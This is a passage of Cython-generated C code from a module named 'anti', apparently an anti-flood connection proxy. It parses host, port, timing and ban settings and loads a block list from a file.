                                        if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                                        else __PYX_ERR(0, 231, __pyx_L43_error)
                                    }
                                    break;
                                }
                                __Pyx_GOTREF(__pyx_t_1);
                            }
                            __Pyx_XGOTREF(__pyx_7genexpr__pyx_v_4anti_x);
                            __Pyx_DECREF_SET(__pyx_7genexpr__pyx_v_4anti_x, __pyx_t_1);
                            __Pyx_GIVEREF(__pyx_t_1);
                            __pyx_t_1 = 0;
                            __pyx_t_13 = __Pyx_PyObject_IsTrue(__pyx_7genexpr__pyx_v_4anti_x); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 231, __pyx_L43_error)
                                if (__pyx_t_13) {
                                }
                                else {
                                    __pyx_t_2 = __pyx_t_13;
                                    goto __pyx_L47_bool_binop_done;
                                }
                            __pyx_t_13 = (__Pyx_PyUnicode_Equals(__pyx_7genexpr__pyx_v_4anti_x, __pyx_kp_u__15, Py_NE)); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 231, __pyx_L43_error)
                                __pyx_t_2 = __pyx_t_13;
                        __pyx_L47_bool_binop_done:;
                            if (__pyx_t_2) {
                                __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_7genexpr__pyx_v_4anti_x); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 231, __pyx_L43_error)
                                    __Pyx_GOTREF(__pyx_t_1);
                                if (unlikely(__Pyx_ListComp_Append(__pyx_t_5, (PyObject*)__pyx_t_1))) __PYX_ERR(0, 231, __pyx_L43_error)
                                    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                            }
                        }
                        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                        __Pyx_GOTREF(__pyx_7genexpr__pyx_v_4anti_x);
                        __Pyx_DECREF_SET(__pyx_7genexpr__pyx_v_4anti_x, Py_None);
                        goto __pyx_L49_exit_scope;
                    __pyx_L43_error:;
                        __Pyx_GOTREF(__pyx_7genexpr__pyx_v_4anti_x);
                        __Pyx_DECREF_SET(__pyx_7genexpr__pyx_v_4anti_x, Py_None);
                        goto __pyx_L34_error;
                    __pyx_L49_exit_scope:;
                    }
                    __pyx_t_9 = PyList_GET_SIZE(__pyx_t_5); if (unlikely(__pyx_t_9 == ((Py_ssize_t)-1))) __PYX_ERR(0, 231, __pyx_L34_error)
                        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                    {
                        __pyx_t_5 = PyList_New(0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 231, __pyx_L52_error)
                            __Pyx_GOTREF(__pyx_t_5);
                        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_host_real); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 231, __pyx_L52_error)
                            __Pyx_GOTREF(__pyx_t_1);
                        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_split); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 231, __pyx_L52_error)
                            __Pyx_GOTREF(__pyx_t_3);
                        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                        __pyx_t_1 = NULL;
                        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
                            __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_3);
                            if (likely(__pyx_t_1)) {
                                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
                                __Pyx_INCREF(__pyx_t_1);
                                __Pyx_INCREF(function);
                                __Pyx_DECREF_SET(__pyx_t_3, function);
                            }
                        }
                        __pyx_t_4 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_1, __pyx_kp_u__55) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_kp_u__55);
                        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
                        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 231, __pyx_L52_error)
                            __Pyx_GOTREF(__pyx_t_4);
                        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                        if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
                            __pyx_t_3 = __pyx_t_4; __Pyx_INCREF(__pyx_t_3); __pyx_t_14 = 0;
                            __pyx_t_10 = NULL;
                        }
                        else {
                            __pyx_t_14 = -1; __pyx_t_3 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 231, __pyx_L52_error)
                                __Pyx_GOTREF(__pyx_t_3);
                            __pyx_t_10 = Py_TYPE(__pyx_t_3)->tp_iternext; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 231, __pyx_L52_error)
                        }
                        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                        for (;;) {
                            if (likely(!__pyx_t_10)) {
                                if (likely(PyList_CheckExact(__pyx_t_3))) {
                                    if (__pyx_t_14 >= PyList_GET_SIZE(__pyx_t_3)) break;
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                                    __pyx_t_4 = PyList_GET_ITEM(__pyx_t_3, __pyx_t_14); __Pyx_INCREF(__pyx_t_4); __pyx_t_14++; if (unlikely(0 < 0)) __PYX_ERR(0, 231, __pyx_L52_error)
#else
                                    __pyx_t_4 = PySequence_ITEM(__pyx_t_3, __pyx_t_14); __pyx_t_14++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 231, __pyx_L52_error)
                                        __Pyx_GOTREF(__pyx_t_4);
#endif
                                }
                                else {
                                    if (__pyx_t_14 >= PyTuple_GET_SIZE(__pyx_t_3)) break;
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                                    __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_3, __pyx_t_14); __Pyx_INCREF(__pyx_t_4); __pyx_t_14++; if (unlikely(0 < 0)) __PYX_ERR(0, 231, __pyx_L52_error)
#else
                                    __pyx_t_4 = PySequence_ITEM(__pyx_t_3, __pyx_t_14); __pyx_t_14++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 231, __pyx_L52_error)
                                        __Pyx_GOTREF(__pyx_t_4);
#endif
                                }
                            }
                            else {
                                __pyx_t_4 = __pyx_t_10(__pyx_t_3);
                                if (unlikely(!__pyx_t_4)) {
                                    PyObject* exc_type = PyErr_Occurred();
                                    if (exc_type) {
                                        if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                                        else __PYX_ERR(0, 231, __pyx_L52_error)
                                    }
                                    break;
                                }
                                __Pyx_GOTREF(__pyx_t_4);
                            }
                            __Pyx_XGOTREF(__pyx_8genexpr1__pyx_v_4anti_x);
                            __Pyx_DECREF_SET(__pyx_8genexpr1__pyx_v_4anti_x, __pyx_t_4);
                            __Pyx_GIVEREF(__pyx_t_4);
                            __pyx_t_4 = 0;
                            __pyx_t_13 = __Pyx_PyObject_IsTrue(__pyx_8genexpr1__pyx_v_4anti_x); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 231, __pyx_L52_error)
                                if (__pyx_t_13) {
                                }
                                else {
                                    __pyx_t_2 = __pyx_t_13;
                                    goto __pyx_L56_bool_binop_done;
                                }
                            __pyx_t_13 = (__Pyx_PyUnicode_Equals(__pyx_8genexpr1__pyx_v_4anti_x, __pyx_kp_u__15, Py_NE)); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 231, __pyx_L52_error)
                                __pyx_t_2 = __pyx_t_13;
                        __pyx_L56_bool_binop_done:;
                            if (__pyx_t_2) {
                                __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_8genexpr1__pyx_v_4anti_x); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 231, __pyx_L52_error)
                                    __Pyx_GOTREF(__pyx_t_4);
                                if (unlikely(__Pyx_ListComp_Append(__pyx_t_5, (PyObject*)__pyx_t_4))) __PYX_ERR(0, 231, __pyx_L52_error)
                                    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                            }
                        }
                        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                        __Pyx_GOTREF(__pyx_8genexpr1__pyx_v_4anti_x);
                        __Pyx_DECREF_SET(__pyx_8genexpr1__pyx_v_4anti_x, Py_None);
                        goto __pyx_L58_exit_scope;
                    __pyx_L52_error:;
                        __Pyx_GOTREF(__pyx_8genexpr1__pyx_v_4anti_x);
                        __Pyx_DECREF_SET(__pyx_8genexpr1__pyx_v_4anti_x, Py_None);
                        goto __pyx_L34_error;
                    __pyx_L58_exit_scope:;
                    }
                    __pyx_t_14 = PyList_GET_SIZE(__pyx_t_5); if (unlikely(__pyx_t_14 == ((Py_ssize_t)-1))) __PYX_ERR(0, 231, __pyx_L34_error)
                        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                    __pyx_t_5 = PyInt_FromSsize_t((__pyx_t_9 + __pyx_t_14)); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 231, __pyx_L34_error)
                        __Pyx_GOTREF(__pyx_t_5);
                    __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyInt_Type)), __pyx_t_5); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 231, __pyx_L34_error)
                        __Pyx_GOTREF(__pyx_t_3);
                    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                    __pyx_t_5 = __Pyx_PyInt_NeObjC(__pyx_t_3, __pyx_int_8, 8, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 231, __pyx_L34_error)
                        __Pyx_GOTREF(__pyx_t_5);
                    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                    __pyx_t_2 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 231, __pyx_L34_error)
                        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                    if (__pyx_t_2) {
                        __pyx_t_5 = __Pyx_PyNumber_Int(__pyx_n_u_KhanhNguyen9872); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 232, __pyx_L34_error)
                            __Pyx_GOTREF(__pyx_t_5);
                        if (PyDict_SetItem(__pyx_d, __pyx_n_s__38, __pyx_t_5) < 0) __PYX_ERR(0, 232, __pyx_L34_error)
                            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                    }
                    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_port_real); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 233, __pyx_L34_error)
                        __Pyx_GOTREF(__pyx_t_5);
                    __pyx_t_3 = __Pyx_PyNumber_Int(__pyx_t_5); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 233, __pyx_L34_error)
                        __Pyx_GOTREF(__pyx_t_3);
                    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                    if (PyDict_SetItem(__pyx_d, __pyx_n_s__38, __pyx_t_3) < 0) __PYX_ERR(0, 233, __pyx_L34_error)
                        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_port_fake); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 234, __pyx_L34_error)
                        __Pyx_GOTREF(__pyx_t_3);
                    __pyx_t_5 = __Pyx_PyNumber_Int(__pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 234, __pyx_L34_error)
                        __Pyx_GOTREF(__pyx_t_5);
                    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                    if (PyDict_SetItem(__pyx_d, __pyx_n_s__38, __pyx_t_5) < 0) __PYX_ERR(0, 234, __pyx_L34_error)
                        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_time_connect); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 235, __pyx_L34_error)
                        __Pyx_GOTREF(__pyx_t_5);
                    __pyx_t_3 = __Pyx_PyNumber_Float(__pyx_t_5); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 235, __pyx_L34_error)
                        __Pyx_GOTREF(__pyx_t_3);
                    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                    if (PyDict_SetItem(__pyx_d, __pyx_n_s__38, __pyx_t_3) < 0) __PYX_ERR(0, 235, __pyx_L34_error)
                        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_block_on_count); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 236, __pyx_L34_error)
                        __Pyx_GOTREF(__pyx_t_3);
                    __pyx_t_5 = __Pyx_PyNumber_Int(__pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 236, __pyx_L34_error)
                        __Pyx_GOTREF(__pyx_t_5);
                    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                    if (PyDict_SetItem(__pyx_d, __pyx_n_s__38, __pyx_t_5) < 0) __PYX_ERR(0, 236, __pyx_L34_error)
                        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_reset_on_time); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 237, __pyx_L34_error)
                        __Pyx_GOTREF(__pyx_t_5);
                    __pyx_t_3 = __Pyx_PyNumber_Int(__pyx_t_5); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 237, __pyx_L34_error)
                        __Pyx_GOTREF(__pyx_t_3);
                    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                    if (PyDict_SetItem(__pyx_d, __pyx_n_s__38, __pyx_t_3) < 0) __PYX_ERR(0, 237, __pyx_L34_error)
                        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_is_get_sock); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 238, __pyx_L34_error)
                        __Pyx_GOTREF(__pyx_t_3);
                    __pyx_t_5 = __Pyx_PyNumber_Int(__pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 238, __pyx_L34_error)
                        __Pyx_GOTREF(__pyx_t_5);
                    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                    if (PyDict_SetItem(__pyx_d, __pyx_n_s__38, __pyx_t_5) < 0) __PYX_ERR(0, 238, __pyx_L34_error)
                        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_ban_sock); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 239, __pyx_L34_error)
                        __Pyx_GOTREF(__pyx_t_5);
                    if (PyDict_SetItem(__pyx_d, __pyx_n_s__38, __pyx_t_5) < 0) __PYX_ERR(0, 239, __pyx_L34_error)
                        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_headers); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 240, __pyx_L34_error)
                        __Pyx_GOTREF(__pyx_t_5);
                    if (PyDict_SetItem(__pyx_d, __pyx_n_s__38, __pyx_t_5) < 0) __PYX_ERR(0, 240, __pyx_L34_error)
                        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                }
                __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
                __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
                goto __pyx_L39_try_end;
            __pyx_L34_error:;
                __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
                __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
                __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0; {
                    __Pyx_AddTraceback("anti", __pyx_clineno, __pyx_lineno, __pyx_filename);
                    if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_3, &__pyx_t_4) < 0) __PYX_ERR(0, 241, __pyx_L36_except_error)
                        __Pyx_GOTREF(__pyx_t_5);
                    __Pyx_GOTREF(__pyx_t_3);
                    __Pyx_GOTREF(__pyx_t_4);
                    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__56, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 242, __pyx_L36_except_error)
                        __Pyx_GOTREF(__pyx_t_1);
                    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                    __pyx_t_1 = __Pyx_PyObject_CallNoArg(__pyx_builtin_input); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 243, __pyx_L36_except_error)
                        __Pyx_GOTREF(__pyx_t_1);
                    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_kill_process); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 244, __pyx_L36_except_error)
                        __Pyx_GOTREF(__pyx_t_1);
                    __pyx_t_11 = __Pyx_PyObject_CallNoArg(__pyx_t_1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 244, __pyx_L36_except_error)
                        __Pyx_GOTREF(__pyx_t_11);
                    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                    goto __pyx_L35_exception_handled;
                }
            __pyx_L36_except_error:;
                __Pyx_XGIVEREF(__pyx_t_8);
                __Pyx_XGIVEREF(__pyx_t_7);
                __Pyx_XGIVEREF(__pyx_t_6);
                __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_6);
                goto __pyx_L1_error;
            __pyx_L35_exception_handled:;
                __Pyx_XGIVEREF(__pyx_t_8);
                __Pyx_XGIVEREF(__pyx_t_7);
                __Pyx_XGIVEREF(__pyx_t_6);
                __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_6);
            __pyx_L39_try_end:;
            } {
                __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__57, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 245, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_6 = __Pyx_PyObject_LookupSpecial(__pyx_t_4, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 245, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_3 = __Pyx_PyObject_LookupSpecial(__pyx_t_4, __pyx_n_s_enter); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 245, __pyx_L61_error)
                    __Pyx_GOTREF(__pyx_t_3);
                __pyx_t_5 = __Pyx_PyObject_CallNoArg(__pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 245, __pyx_L61_error)
                    __Pyx_GOTREF(__pyx_t_5);
                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                __pyx_t_3 = __pyx_t_5;
                __pyx_t_5 = 0;
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0; {
                    {
                        __Pyx_PyThreadState_declare
                            __Pyx_PyThreadState_assign
                            __Pyx_ExceptionSave(&__pyx_t_7, &__pyx_t_8, &__pyx_t_15);
                        __Pyx_XGOTREF(__pyx_t_7);
                        __Pyx_XGOTREF(__pyx_t_8);
                        __Pyx_XGOTREF(__pyx_t_15); {
                            if (PyDict_SetItem(__pyx_d, __pyx_n_s_f, __pyx_t_3) < 0) __PYX_ERR(0, 245, __pyx_L65_error)
                                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                            {
                                __pyx_t_3 = PyList_New(0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 246, __pyx_L73_error)
                                    __Pyx_GOTREF(__pyx_t_3);
                                __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_f); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 246, __pyx_L73_error)
                                    __Pyx_GOTREF(__pyx_t_11);
                                __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_read); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 246, __pyx_L73_error)
                                    __Pyx_GOTREF(__pyx_t_1);
                                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                                __pyx_t_11 = NULL;
                                if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
                                    __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_1);
                                    if (likely(__pyx_t_11)) {
                                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
                                        __Pyx_INCREF(__pyx_t_11);
                                        __Pyx_INCREF(function);
                                        __Pyx_DECREF_SET(__pyx_t_1, function);
                                    }
                                }
                                __pyx_t_5 = (__pyx_t_11) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_11) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
                                __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
                                if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 246, __pyx_L73_error)
                                    __Pyx_GOTREF(__pyx_t_5);
                                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                                __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_split); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 246, __pyx_L73_error)
                                    __Pyx_GOTREF(__pyx_t_1);
                                __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                                __pyx_t_5 = NULL;
                                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
                                    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_1);
                                    if (likely(__pyx_t_5)) {
                                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
                                        __Pyx_INCREF(__pyx_t_5);
                                        __Pyx_INCREF(function);
                                        __Pyx_DECREF_SET(__pyx_t_1, function);
                                    }
                                }
                                __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_5, __pyx_kp_u__3) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_kp_u__3);
                                __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                                if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 246, __pyx_L73_error)
                                    __Pyx_GOTREF(__pyx_t_4);
                                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                                if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
                                    __pyx_t_1 = __pyx_t_4; __Pyx_INCREF(__pyx_t_1); __pyx_t_14 = 0;
                                    __pyx_t_10 = NULL;
                                }
                                else {
                                    __pyx_t_14 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 246, __pyx_L73_error)
                                        __Pyx_GOTREF(__pyx_t_1);
                                    __pyx_t_10 = Py_TYPE(__pyx_t_1)->tp_iternext; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 246, __pyx_L73_error)
                                }
                                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                                for (;;) {
                                    if (likely(!__pyx_t_10)) {
                                        if (likely(PyList_CheckExact(__pyx_t_1))) {
                                            if (__pyx_t_14 >= PyList_GET_SIZE(__pyx_t_1)) break;
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                                            __pyx_t_4 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_14); __Pyx_INCREF(__pyx_t_4); __pyx_t_14++; if (unlikely(0 < 0)) __PYX_ERR(0, 246, __pyx_L73_error)
#else
                                            __pyx_t_4 = PySequence_ITEM(__pyx_t_1, __pyx_t_14); __pyx_t_14++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 246, __pyx_L73_error)
                                                __Pyx_GOTREF(__pyx_t_4);
#endif
                                        }
                                        else {
                                            if (__pyx_t_14 >= PyTuple_GET_SIZE(__pyx_t_1)) break;
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                                            __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_14); __Pyx_INCREF(__pyx_t_4); __pyx_t_14++; if (unlikely(0 < 0)) __PYX_ERR(0, 246, __pyx_L73_error)
#else
                                            __pyx_t_4 = PySequence_ITEM(__pyx_t_1, __pyx_t_14); __pyx_t_14++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 246, __pyx_L73_error)
                                                __Pyx_GOTREF(__pyx_t_4);
#endif
                                        }
                                    }
                                    else {
                                        __pyx_t_4 = __pyx_t_10(__pyx_t_1);
                                        if (unlikely(!__pyx_t_4)) {
                                            PyObject* exc_type = PyErr_Occurred();
                                            if (exc_type) {
                                                if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                                                else __PYX_ERR(0, 246, __pyx_L73_error)
                                            }
                                            break;
                                        }
                                        __Pyx_GOTREF(__pyx_t_4);
                                    }
                                    __Pyx_XGOTREF(__pyx_8genexpr2__pyx_v_4anti_x);
                                    __Pyx_DECREF_SET(__pyx_8genexpr2__pyx_v_4anti_x, __pyx_t_4);
                                    __Pyx_GIVEREF(__pyx_t_4);
                                    __pyx_t_4 = 0;
                                    __pyx_t_13 = __Pyx_PyObject_IsTrue(__pyx_8genexpr2__pyx_v_4anti_x); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 246, __pyx_L73_error)
                                        if (__pyx_t_13) {
                                        }
                                        else {
                                            __pyx_t_2 = __pyx_t_13;
                                            goto __pyx_L77_bool_binop_done;
                                        }
                                    __pyx_t_13 = (__Pyx_PyUnicode_Equals(__pyx_8genexpr2__pyx_v_4anti_x, __pyx_kp_u__15, Py_NE)); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 246, __pyx_L73_error)
                                        __pyx_t_2 = __pyx_t_13;
                                __pyx_L77_bool_binop_done:;
                                    if (__pyx_t_2) {
                                        __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_8genexpr2__pyx_v_4anti_x); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 246, __pyx_L73_error)
                                            __Pyx_GOTREF(__pyx_t_4);
                                        if (unlikely(__Pyx_ListComp_Append(__pyx_t_3, (PyObject*)__pyx_t_4))) __PYX_ERR(0, 246, __pyx_L73_error)
                                            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                                    }
                                }
                                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                                __Pyx_GOTREF(__pyx_8genexpr2__pyx_v_4anti_x);
                                __Pyx_DECREF_SET(__pyx_8genexpr2__pyx_v_4anti_x, Py_None);
                                goto __pyx_L79_exit_scope;
                            __pyx_L73_error:;
                                __Pyx_GOTREF(__pyx_8genexpr2__pyx_v_4anti_x);
                                __Pyx_DECREF_SET(__pyx_8genexpr2__pyx_v_4anti_x, Py_None);
                                goto __pyx_L65_error;
                            __pyx_L79_exit_scope:;
                            }
                            if (PyDict_SetItem(__pyx_d, __pyx_n_s_block, __pyx_t_3) < 0) __PYX_ERR(0, 246, __pyx_L65_error)
                                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                        }
                        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
                        __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
                        goto __pyx_L70_try_end;
                    __pyx_L65_error:;
                        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
                        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
                        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0; {
                            __Pyx_AddTraceback("anti", __pyx_clineno, __pyx_lineno, __pyx_filename);
                            if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_1, &__pyx_t_4) < 0) __PYX_ERR(0, 245, __pyx_L67_except_error)
                                __Pyx_GOTREF(__pyx_t_3);
                            __Pyx_GOTREF(__pyx_t_1);
                            __Pyx_GOTREF(__pyx_t_4);
                            __pyx_t_5 = PyTuple_Pack(3, __pyx_t_3, __pyx_t_1, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 245, __pyx_L67_except_error)
                                __Pyx_GOTREF(__pyx_t_5);
                            __pyx_t_16 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_5, NULL);
                            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
